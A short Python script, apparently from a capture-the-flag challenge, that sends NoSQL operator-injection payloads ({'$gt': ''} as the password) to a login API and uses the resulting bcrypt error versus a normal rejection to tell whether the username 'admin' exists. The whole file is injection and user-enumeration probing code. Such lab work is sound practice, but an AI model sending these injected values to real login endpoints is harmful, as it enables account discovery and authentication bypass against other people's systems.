import requests
import json
import string

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# The error on /api/v2/login with password: {"$gt": ""} suggests that:
# 1. The database layer might be accepting the object {"$gt": ""} instead of failing validation.
# 2. It queries the DB and finds a user "admin".
# 3. It tries to compare the returned hash from the DB with the provided password using bcrypt.compareSync
# 4. BUT if the user "admin" is found, bcrypt.compareSync is called with bcrypt.compareSync(req.body.password, user.password_hash)
# 5. If req.body.password is {"$gt": ""}, it throws "Error: Illegal arguments: object, string".

# Wait, if `bcrypt.compareSync` throws an error, it means the query returned a user!
# If the query did NOT return a user, it would probably return "Invalid credentials" without reaching `bcrypt.compareSync`!

# Let's verify this hypothesis.
# If I send an invalid username with password: {"$gt": ""}, does it throw the same error or "Invalid credentials"?

payload_valid = {"username": "admin", "password": {"$gt": ""}}
r1 = requests.post(url, json=payload_valid, headers=headers)
print("Valid user:", r1.status_code) # Should be 500

payload_invalid = {"username": "nonexistent_user_12345", "password": {"$gt": ""}}
r2 = requests.post(url, json=payload_invalid, headers=headers)
print("Invalid user:", r2.status_code) # Should be 401 or something?
